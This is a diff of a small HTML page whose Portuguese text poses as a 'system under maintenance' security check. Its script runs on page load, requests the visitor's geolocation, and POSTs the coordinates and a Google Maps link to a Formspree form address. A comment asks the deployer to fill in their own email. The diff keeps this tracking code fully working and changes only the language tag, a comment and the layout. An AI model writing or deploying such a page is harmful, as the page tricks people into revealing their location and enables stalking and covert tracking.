@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13,19 +13,16 @@
         <h1>SISTEMA EM MANUTENÇÃO</h1>
         <p>Aguarde a verificação de segurança...</p>
     </div>
-
     <script>
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(enviarLocalizacao, erro);
             }
         };
-
         function enviarLocalizacao(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            
-            // ATENÇÃO: Substitua 'SEU_EMAIL_AQUI' pelo ID que o Formspree te der ou seu e-mail
+            // Substitua SEU_EMAIL_AQUI pelo seu e-mail real
             fetch('https://formspree.io/f/SEU_EMAIL_AQUI', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -34,14 +31,9 @@
                     Longitude: lon,
                     Mapa: `https://www.google.com/maps?q=${lat},${lon}`
                 })
-            }).then(() => {
-                console.log("Sucesso.");
-            });
+            }).then(() => { console.log("Sucesso."); });
         }
-
-        function erro() {
-            console.log("Permissão negada.");
-        }
+        function erro() { console.log("Erro ao capturar."); }
     </script>
 </body>
 </html>
